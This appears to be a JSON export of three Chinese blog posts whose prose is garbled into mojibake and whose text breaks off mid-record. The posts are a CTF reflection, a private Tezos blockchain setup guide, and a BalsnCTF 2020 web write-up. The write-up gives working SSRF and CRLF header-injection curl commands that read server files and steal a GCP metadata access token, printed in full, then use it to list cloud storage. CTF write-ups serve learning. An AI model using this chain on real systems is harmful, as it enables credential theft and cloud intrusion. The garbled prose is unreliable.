[{"title":"AIS3 EOF CTF 2020 å¿ƒå¾—","url":"/zh-tw/2021/ais3-eof-ctf-2020/","content":"\n\n## Qual\nåœ¨çµ„éšŠçš„æ™‚å€™å°±å·®é»æ‰¾ä¸åˆ°éšŠå‹(å…¶å¯¦æ˜¯æˆ‘ä¸€ç›´å¿˜è¨˜é€™ä»¶äº‹)ï¼Œæœ€å¾Œå¾ NCtfU ä¸­ç›´æ¥æ‹‰æ»¿äººã€‚\né€™å ´æœ€åˆºæ¿€çš„å…¶å¯¦ä¸æ˜¯æ¯”è³½ï¼Œæ˜¯æ¯”è³½å‰›å¥½åœ¨æœŸæœ«è€ƒå‰ä¸€é€±çš„é€±æœ«ï¼Œç”±æ–¼å·²ç¶“çµ„å¥½å°äº†ï¼Œæ‰€ä»¥å°±æŠ±è‘—æœŸæœ«è€ƒä¹‹å¾Œç†¬å¤œçœ‹å°±å¥½çš„å¿ƒæ…‹å»æ¯”è³½ XDDDD\n<!-- more -->\nåˆè³½çš„éƒ¨åˆ†å…¶å¯¦è²¢ç»ä¸å¤šï¼Œå¤§å¤šéƒ½æ˜¯è·Ÿåˆ¥äººè¨è«–å®Œé¡Œç›®ä¹‹å¾Œåˆ¥äººå°±è§£å‡ºä¾†äº†(éšŠå‹è¶…ç´š Carry Orz)ï¼Œæ‰€ä»¥å…¶å¯¦æˆ‘åˆè³½å¯ä»¥èªªè²¢ç»å€¼ == 0 QQ\n\næœ€å¾Œè·‘å»è§£ Abexcm100ï¼Œä¸€é¡Œ terrynini å‡ºçš„ reverseï¼Œæœ€å¾Œç™¼ç¾æ˜¯æˆ‘æƒ³å¤ªé›£äº†ã€‚\nä¸€é–‹å§‹æª”æ¡ˆæ‹‰é€² PEiD ç™¼ç¾æ˜¯ `PEspin` Packed çš„æ™‚å€™å°±æ‰“ç®—ç›´æ¥ç¡¬æ‹†ä»–é‚„ä¸€ç›´æ‰¾ OEPã€‚\nçµæœæœ€å¾Œç™¼ç¾å…¶å¯¦é¡Œç›®è¦çš„åªæ˜¯ä½ æ…¢æ…¢è¿½ç¨‹å¼çš„è¡Œç‚ºè€Œå·²ï¼Œåœ¨åˆè³½çµæŸå¾ŒåŠå€‹å°æ™‚æ‰æŠŠä»–è§£æ‰äº†\n{% asset_img abe.jpg %}\n\nåˆè³½æœ€å¾Œæ‹¿åˆ°äº† `12/15` æ™‰ç´šæ±ºè³½ï¼\n{% asset_img qual.png %}\n\n## Final\næ¯”è³½å‰ä¸€å¤©é‚„è·‘å»æ‰“å·¥ï¼Œçµæœéš”å¤©ç´¯çˆ†QQã€‚\nç¬¬ä¸€å¤© 9:30 é–‹å§‹å ±åˆ°ï¼Œçµæœæˆ‘ 9:15 å°±åˆ°äº†ï¼Œè·¯ä¸Šé‚„é‡åˆ°è”¡ç²½å¤§ä½¬ Orzï¼Œé–‹è³½å‰ä¹Ÿå‰›å¥½é‡åˆ°ä¿Šç©æ•™æˆé‚„æœ‰æ¬£æ˜æ•™æˆï¼Œå¯’æš„å¹¾å¥ä¹‹å¾Œå°±é–‹å§‹æ¯”è³½æƒ¹ã€‚\n\nä¸€é–‹è³½å°±å–µäº†ä¸€çœ¼ Web é¡Œåˆ†åˆ¥æ˜¯ Regex Master è·Ÿ WhoisTool ç™¼ç¾åˆ†åˆ¥æ˜¯ `JavaScript` è·Ÿ `Golang` å¯«äº†é¡Œç›®ä¹‹å¾Œæœæ–·æ”¾æ£„(æ¬¸ï¼Œè·‘å»çœ‹ Reverseã€‚\n\nReverse å¤§éƒ¨åˆ†éƒ½æ˜¯ ARAY ç³»åˆ—é¡Œï¼Œæ˜¯ Inndy å¤§ä½¬å‡ºçš„ï¼Œé–‹ä¾†çœ‹ä¹‹å¾Œç™¼ç¾æ˜¯ Yara Ruleï¼Œå…¶ä¸­ rule æ˜¯ç¶“é `yarac` ç·¨è­¯éçš„ã€‚\n\nèº«ç‚ºä¸€å€‹ä¸€è¨€ä¸åˆå°±ç¡¬å¹¹çš„ç©å®¶ï¼Œçœ‹åˆ°ç·¨è­¯éçš„æª”æ¡ˆå°±æ˜¯å…ˆç”¨ `strings` çœ‹ï¼Œçµæœå°±çŒœåˆ°äº† XDã€‚\næª”æ¡ˆè£¡é¢æœ‰ 44 å€‹ Flag (åªæœ‰å…¶ä¸­ä¸€å€‹æ˜¯å°çš„)ï¼Œä¸€é–‹å§‹å°±ç„¡è…¦æŒ‘å¹¾å€‹é€å°±ä¸­äº† XDDã€‚å¾Œä¾†å›å»çœ‹é¡Œç›®æ•˜è¿°æ‰ç™¼ç¾æœ‰æç¤ºå¯ä»¥æŠŠ Flag å„è‡ªæ‹†æˆæª”æ¡ˆï¼Œé€™æ‰æƒ³èµ·ä¾†æ‡‰è©²è¦ç”¨ yara ä¸‹å»æƒæ‰å° (é€™æ‰æ˜¯æ­£è¦è§£)\n\nARAY2 çš„é¡Œç›®å°±åŸºæœ¬ä¸Šæ˜¯ä¸€æ®µä¸€æ®µçš„ flag ç”¨è®Šæ•¸å­˜èµ·ä¾†ï¼Œåªæ˜¯æˆ‘æ˜¯ç”¨ `hexdump -C` æ‰€ä»¥ output æœƒæ˜¯ Hex + ASCIIï¼Œçœ‹èµ·ä¾†è¶…é†œï¼ŒèŠ±äº†ä¸€é»æ™‚é–“æ‰æ‹¼å‡º flagã€‚\n\nç¬¬ä¸€å¤©çš„é€²åº¦å¤§æ¦‚å°±é€™æ¨£ï¼Œçœ‹å®Œ ARAY å‰é¢å…©é¡Œä¹‹å¾Œå°±åˆè·‘å›å»çœ‹ Webï¼Œé›–ç„¶æ²’æœ‰ä»»ä½•é€²å±• XDDï¼Œæœ€å¾Œå¥½åƒ 9 é»å¤šå°±è·³å»åºŠä¸Šçˆ†ç¡äº†(é‚„è¢«åœ°éœ‡æ–é†’)ï¼Œä¸€è·¯ç¡åˆ°éš”å¤©æ—©ä¸Šã€‚\n\nç¬¬äºŒå¤©å¤§æ¦‚å°±æ˜¯ç¬¬ä¸€å¤©å¾ŒåŠæ®µçš„ç„¡é™è¼ªè¿´ï¼Œä¸æ–·å°è‘— Code ç™¼å‘†ï¼Œå¥½éšªåœ¨ç¬¬äºŒå¤©çš„ä¸‹åˆåˆåŠ›è§£å‡ºäº†å…©é¡Œï¼Œè¦ä¸ç„¶çœŸçš„æœƒå¢Šåº• QQã€‚\n\næœ€å¾Œåæ¬¡ `8/25` (åŒ…å« GCC)\n{% asset_img final.png %}\n\n\nå…¶å¯¦ Final é‚„æœ‰ä¸€ä»¶è¶£äº‹ï¼Œåœ¨å‰äº›æ™‚é–“ ISIP é‚„æœ‰è·Ÿå…¶ä»–åœ‹å®¶å…±åŒèˆ‰è¾¦ [GCC](https://gcc.ac)ï¼Œå› ç‚ºå‰›å¥½èªè­˜çš„æ•™æˆæœ‰è¢«é‚€è«‹å»ç•¶è¬›å¸«ï¼Œæ•™æˆå°±æŒ‡æ´¾æˆ‘å¹«å¿™å‡ºé¡Œç›®ï¼Œå…¶ä¸­æœ‰å…©é¡Œæ˜¯åŸæœ¬æ‰“ç®— GCC ä¸­æœ€å¾Œçš„ Final æ‹¿å‡ºä¾†ï¼Œçµæœå¾Œé¢å¥½åƒæ¬£æ˜æ•™æˆé‚„æœ‰å…¶ä»–æ•™æˆæ±ºå®š GCC Final è·Ÿ EOF Final åˆè¾¦ï¼Œæ‰€ä»¥åŸæœ¬æˆ‘å‡ºçš„é¡Œç›®ä¹Ÿæœƒå‡ºç¾åœ¨ EOF Final XDDã€‚\n\n\n## æœ€å¾Œ\næ„Ÿè¬éšŠå‹çš„ç„¡æ•µ Carryï¼Œåœ¨æœ€å¾Œé¢çš„ Final æˆ‘å€‘æ‹¿åˆ°äº†æ½›åŠ›çï¼Œè¿‘æœŸéƒ½åœ¨ç”¨å¯¦é©—å®¤çš„æ±è¥¿ï¼Œå·²ç¶“è·Ÿ CTF æœ‰é»è„«ç¯€äº†ï¼Œæœ€å¾Œé‚„æœ‰æ‹¿çå…¶å¯¦æœ‰é»æ„å¤– XDã€‚\n\næ„Ÿè¬æˆ‘çš„éšŠå‹ `r888800009`, `maple3142`, `JyunD` å¸¶æˆ‘é£› Orz","categories":["writeup","AIS3","EOF","2020"]},{"title":"Tezos Blockchain Part I","url":"/zh-tw/2021/tezos-blockchain-part-1/","content":"\n\n## ç·£ç”±\nåœ¨å¤§äºŒä¸Šçš„æŸå¤©ï¼Œè¢«æ•™æˆæŒ‡æ´¾è‡ªå¹¹ç§æ¶çš„ tezos å€å¡Šéˆï¼Œä½†æ˜¯è€å¯¦èªªæˆ‘å°å€å¡Šéˆä¸€é»éƒ½ä¸ç†Ÿï¼Œå°±åªå¥½ç¡¬è‘—é ­çš®ç¡¬å¹¹ã€‚\nä¹Ÿå› ç‚º tezos æ˜¯ç•¶å‰å€å¡Šéˆè¼ƒæ–°çš„æŠ€è¡“ï¼Œæ‰€ä»¥ document ~~(è·Ÿå±ä¸€æ¨£)~~ å¾ˆåˆ†æ•£ï¼Œéœ€è¦è‡ªå·±å‹•æ‰‹æŒ–ã€‚\n\n<!-- more -->\n\né€™ä»½ç´€éŒ„ä¸»è¦æ‡‰è©²æœƒåˆ†æˆä¸‰å€‹ partã€‚\nPart I æ˜¯ tezos åˆ°åº•åœ¨å¹¹å˜›ï¼Œè©²å¦‚ä½•æ¶è¨­ `carthagenet`ã€‚\nPart II æ˜¯ tezos å‡ç´šå”å®šçš„éç¨‹é‚„æœ‰ tezos éŒ¢åŒ…çš„ä½¿ç”¨ã€‚\nPart III æ˜¯ä½¿ç”¨å¸‚é¢ä¸Šçš„ blcok explorer ä¾†å°‡å€å¡Šéˆä¸Šçš„è³‡æ–™å¯è¦–åŒ–ã€‚\n\n## å°æŠ±æ€¨ :full_moon_with_face:\nä¸€é–‹å§‹æ¶ tezos é¸ç”¨çš„å¥—ä»¶åªæœ‰æ”¯æ´èˆŠçš„å”å®šï¼Œè€Œä¸”å…¶ä¸­ä¹Ÿæœ‰é‡åˆ°ä¸€äº› Bugã€‚åœ¨ debug é‚„æœ‰å¯¦ä½œçš„æ™‚å€™å¾€å¾€éƒ½æœƒç™¼ç¾ tezos å®˜æ–¹ document è·Ÿå±ä¸€æ¨£ï¼Œæœ€å¾Œåªå¥½ç›´æ¥æŒ– source code çœ‹é‚„æ¯”è¼ƒå¿«ã€‚(é›–ç„¶ source code æ˜¯ç”¨ ocaml å¯¦ä½œï¼ŒçœŸçš„æ²’æœ‰å¾ˆç†è§£ä»–çš„èªæ³•å°±æ˜¯äº†)\n\n## About Tezos\nè«‹è‡ªè¡Œç§»é§• [Wikipedia](https://en.wikipedia.org/wiki/Tezos) XDDã€‚\n\nä¸»è¦æœ‰ä»¥ä¸‹ç‰¹é»\n1. ä½¿ç”¨ Proof-of-Stack(PoS) è€Œä¸æ˜¯ Proof-of-Work(PoW)ï¼Œé€™å¯ä»¥æœ‰æ•ˆæ¸›å°‘ PoW é‹ç®—æ‰€å¸¶ä¾†çš„èƒ½æºæè€—å•é¡Œï¼Œä½†æ˜¯å…¶ä¸­ä¹Ÿæ˜¯æœ‰ä¸€äº›ç¼ºé»ï¼Œå…¶ä¸­ä¸€å€‹å°±æ˜¯æœ‰å¯èƒ½é€ æˆå±¯å¹£çš„æƒ…æ³\n2. æ•´å€‹å€å¡Šéˆå¯ä»¥é€é Baker (ç¤¦å·¥) çš„å…±è­˜ä¾†é”åˆ°å”å®šå‡ç´šã€æ›´æ–°ï¼Œå¯ä»¥å…é™¤ Bitcoin å’Œ Ethereum å‡ºç¾ç¡¬/è»Ÿåˆ†å²”çš„å•é¡Œã€‚\n3. Tezos è‡ªå·±æ¨å‡ºäº†ä¸€å€‹æ™ºæ…§å‹åˆç´„ Michealsonï¼Œæˆ‘å€‹äººä¹Ÿé‚„åœ¨çœ‹é€™éƒ¨åˆ†çš„è³‡è¨Šï¼Œè½èªªæœ‰ä½¿ç”¨ä¸€äº›é©—è­‰ï¼Œå¯ä»¥é™ä½æ™ºæ…§å‹åˆç´„çš„æ¼æ´\n\n### ä¸€äº›åè©è§£é‡‹\n- Baker (ç¤¦å·¥)\n- Endorsement (é—œæ–¼æ–°å€å¡Šçš„è¡Œç‚º)\n- Delegation (å°‡è³‡ç”¢å§”è¨— Baker ä»£ç‚ºæŒ–ç¤¦)\n\n## æ¶è¨­ Tezos Blockchain (Carthagenet)\né€™æ¬¡ä½¿ç”¨çš„æ˜¯ GitHub ä¸Šé¢çš„é–‹æºå°ˆæ¡ˆ [private-tezos-blockchain](https://github.com/racterub/private-tezos-blockchain) (é€™é‚Šçš„ GitHub é€£çµæ˜¯æˆ‘çš„ Forkï¼Œä¿®å¥½ä¸€äº›æ±è¥¿äº†)\n\n**é€™é‚Šéƒ½ä»¥é–‹ä¸‰å€‹ node ç‚ºä¾‹å­**\n\n\n### Build Base Image\nç›´æ¥å¾ repo è£¡é¢ build èµ·ä¾†å°±å¥½äº†\n```sh\ndocker build -t ubuntu-tezos .\n```\n\n### Create Volume\né¦–å…ˆå…ˆé–‹ä¸‰å€‹ volume ä¾†å­˜ node è³‡æ–™\n```sh\ndocker volume create tezos-volume-1\ndocker volume create tezos-volume-2\ndocker volume create tezos-volume-3\n```\n\n### Fetch Binaries\næ¥ä¸‹ä¾†è¦ä¸‹è¼‰ tezos éœ€è¦çš„ç¨‹å¼ï¼Œæ³¨æ„é€™é‚Šçš„ `GenesisKey` éœ€è¦ä¸€è‡´ï¼Œæ‰€ä»¥è«‹å­˜å¥½ä½ çš„ keyã€‚\n```sh\ndocker run --rm -v tezos-volume-1:/base-dir -it ubuntu-tezos fetch-binaries --base-chain carthagenet\ndocker run --rm -v tezos-volume-2:/base-dir -it ubuntu-tezos fetch-binaries --base-chain carthagenet --genesis-key <genesis-key>\ndocker run --rm -v tezos-volume-3:/base-dir -it ubuntu-tezos fetch-binaries --base-chain carthagenet --genesis-key <genesis-key>\n```\n\n### Start Node\nåœ¨é€™å€‹æ­¥é©Ÿæˆ‘å€‘æœƒä¸€æ¬¡å°‡ `node`, `baker`, `endorser` ä¸€èµ·åŸ·è¡Œã€‚\n\nåŸ·è¡Œä¹‹å‰è«‹å…ˆæ³¨æ„ä¸€ä¸‹ä¸€äº›äº‹æƒ…\n1. åœ¨åŸ·è¡ŒæŒ‡ä»¤æ™‚ï¼Œé è¨­æœƒå°‡ baker çš„å…¬ç§é‘°åå‡ºä¾†ï¼Œè«‹å¥½å¥½å­˜è‘—\n2. `--peer` çš„ ip:port è«‹ä¾ç…§å¯¦éš›æƒ…æ³èª¿æ•´ï¼Œåªéœ€è¦æŒ‡å‘æˆ‘å€‘ç¬¬ä¸€å€‹ node çš„ RPC port å°±å¥½äº†\n3. åŸ·è¡Œå®Œä¹‹å¾Œåä¸€å † error è·Ÿ warning æ˜¯æ­£å¸¸çš„ï¼Œä½ åªéœ€è¦çœ‹åˆ°é€™å€‹è¨Šæ¯ `p2p.maintenance: Too few connections (1)` ï¼Œå¾Œé¢çš„æ•¸å­—æœƒä¾ç…§ä½ é–‹èµ·ä¾†çš„ node å¢åŠ ï¼Œå¦‚æœæˆ‘å€‘é–‹ä¸‰å€‹ nodeï¼Œå°±æœƒæœ‰å…©å€‹ peerï¼Œæ‰€ä»¥æœ€å¾Œå¯ä»¥çœ‹åˆ°å¾Œé¢æœƒæ˜¯ `(2)`\n\n```sh\ndocker run --rm --name tezos-node-1 --expose 8733 -p 8732:8732 -p 8733:8733 -v tezos-volume-1:/base-dir -it start-baker --net-addr-port 8733\ndocker run --rm --name tezos-node-2 --expose 8734 -p 8734:8734 -v tezos-volume-2:/base-dir -it start-baker --net-addr-port 8734 --peer 172.17.0.2:8733\ndocker run --rm --name tezos-node-3 --expose 8735 -p 8735:8735 -v tezos-volume-3:/base-dir -it start-baker --net-addr-port 8734 --peer 172.17.0.2:8733\n```\n\n### å•Ÿç”¨å€å¡Šéˆ\nå…ˆç·¨è¼¯ [scripts/parameters.json](https://github.com/racterub/private-tezos-blockchain/blob/master/parameters/parameters_carthagenet.json) æŠŠä½ å‰é¢ start-baker æ‹¿åˆ°çš„ public key ä¸Ÿé€² `bootstrap_accounts` å°±å¥½äº†\næœ€å¾ŒæŠŠ `parameters.json` ä¸Ÿé€² node è£¡é¢\n```sh\ndocker cp parameters.json tezos-node-1:/parameter.json\ndocker cp parameters.json tezos-node-2:/parameter.json\ndocker cp parameters.json tezos-node-3:/parameter.json\n```\n\næœ€å¾ŒåŸ·è¡Œä¸‹é¢æŒ‡ä»¤å°±å¥½ (`-A` æŒ‡å‘ç¬¬ä¸€å€‹ node çš„ IPï¼Œ`-P` æŒ‡å‘ 8732)\n```sh\ndocker exec tezos-node-1 ./scripts/activate-protocol.sh -A 172.17.0.2 -P 8732 --base-dir /base-dir --tezos-client /base-dir/tezos-client --parameters /parameters.json\n```\n\nåŸ·è¡Œå®Œä¹‹å¾Œä½ çš„ä¸‰å€‹ node å°±æœƒé–‹å§‹æŒ–ç¤¦äº†\n\n## æ¥ä¸‹ä¾†å°±ä¾†èŠèŠä¿®äº†ä»€éº¼ bug\n1. ä¸»è¦å°±æ˜¯ä¸€é–‹å§‹åœ¨æ¶çš„æ™‚å€™æœƒç™¼ç¾ä¸‰å€‹ node æ“ºåˆ°å¾Œé¢è³‡æ–™æœƒä¸åŒæ­¥ï¼Œæ•´å€‹å€å¡Šéˆå°±çˆ›æ‰äº†ï¼Œæœ€å¾Œç¿»åˆ° [é€™è¡Œ code](https://github.com/racterub/private-tezos-blockchain/blob/08bf39ee36e579fee0c2d979609cb327ac3d9a42/scripts/start-baker.sh#L16) ä¸­çš„ `--bootstrap-threshold` ï¼Œè¦æ›´æ”¹æˆä½  peer çš„æ•¸é‡æ‰å°ï¼Œæ‰€ä»¥é€™é‚Šéƒ½è¦æ‰‹å‹•æ”¹\n2. å¦å¤–ä¸€å€‹è·Ÿä¸Šé¢æ˜¯åœ¨åŒä¸€è¡Œ codeï¼Œé€™å€‹æœƒåœ¨ Part III è¬›åˆ°\n\n## å¦‚ä½•ä½¿ç”¨ tezos\nå¯ä»¥å¾ç¶²è·¯ä¸Šè¼‰ [tezos-client](https://github.com/serokell/tezos-packaging/releases) ä¹Ÿå¯ä»¥ç›´æ¥å¾ node è£¡é¢è¤‡è£½ä¸€ä»½å‡ºä¾†ç”¨\n\n### è½‰å¸³\nå¾ a è½‰ 10000 tz åˆ° b (b å¯ä»¥æ›æˆ public key)\n`./tezos-client transfer 10000 from a to b`\n(å¦‚æœ b çš„å¸³æˆ¶ç‚º 0 çš„è©±æœƒéœ€è¦åŠ ä¸Š `--burn-cap 0.257`)\n\n### å¸³æˆ¶ç¸½é¡\nå–å¾— a çš„å¸³æˆ¶ç¸½é¡ï¼Œä¹Ÿå¯ä»¥æ›æˆ public key\n`./tezos get balance for a`\n\n## ç¸½çµ\nPart I ä¸»è¦æ˜¯åŸºæœ¬çš„æ¶è¨­ï¼Œæ¥ä¸‹ä¾†æœƒè«‡åˆ°æ–°çš„ test networkï¼Œé‚„æœ‰æ€éº¼å‡ä¸Šå»ã€‚\næœ€å¾Œæœƒè‡ªæ¶ block explorer ä¾†å°‡è³‡æ–™å¯è¦–åŒ–ã€‚","categories":["blockchain","tezos"]},{"title":"BalsnCTF 2020 [Web] tpc","url":"/zh-tw/2020/balsn20-tpc/","content":"\n\n## Intro\nSolver: @cc85nod, @stdlib.h @ZoneTwelve\næ‰“é†¬æ²¹: @racterub\n\n\n\n```\nFlag is in the working directory\n\nhttp://35.194.175.80:8000\n\n[Update]\n[tpc] Info\nYou don't need to use fuzzing tools to guess file names, The flag file name is unguessable.\n```\n\n<!-- more -->\n\né€™é¡Œä¸»è¦æ˜¯æˆ‘éšŠå‹åœ¨æ‰“çš„ï¼Œæˆ‘åªæœ‰æˆ³å‰é¢çš„éƒ¨åˆ†ï¼Œå¾Œé¢å°±é–‹å§‹æ‰“é†¬æ²¹äº† :poop:\né€™é‚Šçš„ writeup ä¸»è¦æ˜¯è‡ªå·±è³½å¾Œé‡æ–°è‡ªå·±å¯¦ä½œï¼Œé †ä¾¿è¨˜éŒ„æ€•è‡ªå·±å¥å¿˜\n\n\n## Exploit!\n\n\n### File\né¦–å…ˆé€é `/query?site=URL` å¯ä»¥ç™¼ç¾ä½¿ç”¨ `http://` å’Œ `file://` å¯ä»¥é”æˆ SSRF å’Œä»»æ„è®€æª”ã€‚\n\nä¸€é–‹å§‹æˆ‘ä¸»è¦éƒ½åœ¨ç”¨ `file://` æ‰¾ç·šç´¢å…¶ä¸­ `/etc/hosts` å¯ä»¥çŸ¥é“æ©Ÿå™¨ç‚º GCP ä¸»æ©Ÿã€‚\n```\n/etc/hosts\n...\n\n169.254.169.254 metadata.google.internal metadata\n```\n\næ¥ä¸‹ä¾†é€é `/proc/self/environ` å¾—çŸ¥ working directory ç‚º `/opt/workdir`\n```\n00000000: 484f 5354 4e41 4d45 3d74 7063 2d31 0050  HOSTNAME=tpc-1.P\n00000010: 5954 484f 4e5f 5049 505f 5645 5253 494f  YTHON_PIP_VERSIO\n00000020: 4e3d 3139 2e30 2e33 0053 484c 564c 3d31  N=19.0.3.SHLVL=1\n00000030: 0048 4f4d 453d 2f68 6f6d 652f 6767 0047  .HOME=/home/gg.G\n00000040: 5047 5f4b 4559 3d30 4439 3644 4634 4434  PG_KEY=0D96DF4D4\n00000050: 3131 3045 3543 3433 4642 4642 3137 4632  110E5C43FBFB17F2\n00000060: 4433 3437 4541 3641 4136 3534 3231 4400  D347EA6AA65421D.\n00000070: 5041 5448 3d2f 7573 722f 6c6f 6361 6c2f  PATH=/usr/local/\n00000080: 6269 6e3a 2f75 7372 2f6c 6f63 616c 2f73  bin:/usr/local/s\n00000090: 6269 6e3a 2f75 7372 2f6c 6f63 616c 2f62  bin:/usr/local/b\n000000a0: 696e 3a2f 7573 722f 7362 696e 3a2f 7573  in:/usr/sbin:/us\n000000b0: 722f 6269 6e3a 2f73 6269 6e3a 2f62 696e  r/bin:/sbin:/bin\n000000c0: 004c 414e 473d 432e 5554 462d 3800 5059  .LANG=C.UTF-8.PY\n000000d0: 5448 4f4e 5f56 4552 5349 4f4e 3d33 2e37  THON_VERSION=3.7\n000000e0: 2e32 0050 5744 3d2f 6f70 742f 776f 726b  .2.PWD=/opt/work\n000000f0: 6469 7200                                dir.\n```\n\nç•¶æ™‚ä¹Ÿé€é `/proc/self/cmdline` å¾—åˆ° server source code æª”åä¸¦å¾—åˆ° source code\n```\nimport urllib.request\n\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/query\")\ndef query():\n    site = request.args.get('site')\n    text = urllib.request.urlopen(site).read()\n    return text\n\n\n@app.route(\"/\")\ndef hello_world():\n    return \"/query?site=[your website]\"\n\n\nif __name__ == \"__main__\":\n    app.run(debug=False, host=\"0.0.0.0\", port=8000)\n```\n\n\n### HTTP\néšŠå‹åœ¨ç™¼ç¾ä¸»æ©Ÿç‚º GCP ä¹‹å¾Œå°±å˜—è©¦å¾€ GCP æ‰“ï¼Œé¦–å…ˆæˆ‘å€‘è¦å…ˆæ‹¿åˆ° tokenã€‚\n[GCP metadata API Docs å‚³é€é–€](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)\n\nå–å¾— token çš„ api ç‚º `http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`\n\n\n\nåœ¨ä½¿ç”¨ internal API æ™‚éœ€è¦åœ¨ header æ”¾ä¸Š `Metadata-Flavor: Google`ï¼Œä¹Ÿå› ç‚ºå…ˆå‰çœ‹åˆ° source codeï¼Œå…¶ä¸­ä½¿ç”¨äº† `urllib.request.urlopen`ï¼Œè€Œé€™å€‹å‡½å¼æ˜¯å¯ä»¥é”æˆ `header injection` [Source](https://xz.aliyun.com/t/5123)ï¼Œæ‰€ä»¥æœ€å¾Œçš„ payload æœƒé•·é€™æ¨£\n```\ncurl \"http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0d%0aMetadata-Flavor:Google%0d%0aNO:\"\n\nResponse:\n{\"access_token\":\"ya29.c.KpcB5gfe-8qoLhk8NBKy-H_yC9TnU0ABfGS5CYsidL3jRFSjyHI6PIFOB9xmbHVaaxJwxY8ChP6i7Ya9pFM48Lm-EaElbtSakQw0j3WX_BvzaJcBpF0sgcZXZ-cqOvqhBwKi-qaEsKtQcq8UpW-my2bxYY25CuaoMccQGRNnOwxw3K9tJp_wvkA9JrzN0ZQ8G4MURP_M3Gwtcw\",\"expires_in\":3599,\"token_type\":\"Bearer\"}\n```\n\nå¦å¤–ï¼Œæˆ‘å€‘å¯ä»¥é€é `http://metadata.google.internal/computeMetadata/v1/project/project-id` ä¾†å–å¾—å°ˆæ¡ˆ ID\n```\ncurl \"http://35.194.175.80:8000/query?site=http://metadata.google.internal/computeMetadata/v1/project/project-id%20HTTP/1.1%0d%0aMetadata-Flavor:Google%0d%0aNO:\"\n\nResponse:\nbalsn-ctf-2020-tpc\n\n```\n\næ‰€ä»¥æˆ‘å€‘å¾—åˆ° `project-id: balsn-ctf-2020-tpc`ã€‚\n\nä¹‹å¾Œæˆ‘å€‘å› ç‚ºåœ¨ compute ä¸¦æ²’æœ‰æ‘¸åˆ°å¥‡æ€ªçš„æ±è¥¿ï¼Œæ‰€ä»¥éšŠå‹é–‹å§‹æœå‘ storage æ‘¸ã€‚\n[GCP Storage API Docs](https://cloud.google.com/storage/docs/json_api/v1)\nä»¥ä¸‹æ˜¯ä»–çš„æ€è·¯\n\n{% asset_img pumpkin_chat.png %}\n\n\n### GCP Storage\né¦–å…ˆæˆ‘å€‘è¦å…ˆæ‰¾åˆ° project åº•ä¸‹æœ‰ä»€éº¼ bucketsï¼Œé‚£åœ¨æ‰“ API çš„æ™‚å€™è¦åŠ ä¸Šåœ¨å‰é¢æŠ“åˆ°çš„ `access_token`ã€‚\n[API Docs å‚³é€é–€](https://cloud.google.com/storage/docs/json_api/v1#buckets)\n```\ncurl \"https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc\" -H \"Authorization: Bearer ya29.c.KpcB5gcaFqy_aPerbtIpINj_ZBbI5gwYP34By0nRbUiDgtkIYUgriUlz4UnU7Z2_XbMs86NP4myDg3YOky7_15x-Q_LFA_E817d4yTFwCNi9ZGBtSlwrXbQEVIz4HNE1NSTXhkLp4T20qcmmyrK1zNBEq1yGhwHaDTzQJ03LamKtiJsUBt3qXZbQzY0F8ZgizivVpzdexoAw9Q\"\n\nResponse:\n{\n  \"kind\": \"storage#buckets\",\n  \"items\": [\n    {\n      \"kind\": \"storage#bucket\",\n      \"selfLink\": \"https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"id\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"name\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"projectNumber\": \"909684563558\",\n      \"metageneration\": \"1\",\n      \"location\": \"ASIA\",\n      \"storageClass\": \"STANDARD\",\n      \"etag\": \"CAE=\",\n      \"timeCreated\": \"2020-10-03T05:12:42.035Z\",\n      \"updated\": \"2020-10-03T05:12:42.035Z\",\n      \"iamConfiguration\": {\n        \"bucketPolicyOnly\": {\n          \"enabled\": false\n        },\n        \"uniformBucketLevelAccess\": {\n          \"enabled\": false\n        }\n      },\n      \"locationType\": \"multi-region\"\n    }\n  ]\n}\n```\n\nå¯ä»¥çŸ¥é“åœ¨ project `balsn-ctf-2020-tpc` ä¸‹æœ‰ä¸€å€‹ bucket å«åš `asia.artifacts.balsn-ctf-2020-tpc.appspot.com`\n\né‚£æˆ‘å€‘å°±å¯ä»¥é€é API æ‰¾åˆ° bucket åº•ä¸‹çš„ objects\n[API Docs å‚³é€é–€](https://cloud.google.com/storage/docs/json_api/v1#objects)\n\n```\ncurl \"https://storage.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o\" -H \"Authorization: Bearer ya29.c.KpcB5gcaFqy_aPerbtIpINj_ZBbI5gwYP34By0nRbUiDgtkIYUgriUlz4UnU7Z2_XbMs86NP4myDg3YOky7_15x-Q_LFA_E817d4yTFwCNi9ZGBtSlwrXbQEVIz4HNE1NSTXhkLp4T20qcmmyrK1zNBEq1yGhwHaDTzQJ03LamKtiJsUBt3qXZbQzY0F8ZgizivVpzdexoAw9Q\"\n\nResponse:\n{\n  \"kind\": \"storage#objects\",\n  \"items\": [\n    {\n      \"kind\": \"storage#object\",\n      \"id\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com/containers/images/sha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4/1605158579380048\",\n      \"selfLink\": \"https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4\",\n      \"mediaLink\": \"https://storage.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&alt=media\",\n      \"name\": \"containers/images/sha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4\",\n      \"bucket\": \"asia.artifacts.balsn-ctf-2020-tpc.appspot.com\",\n      \"generation\": \"1605158579380048\",\n      \"metageneration\": \"1\",\n      \"contentType\": \"application/octet-stream\",\n      \"storageClass\": \"STANDARD\",\n      \"size\": \"25459212\",\n      \"md5Hash\": 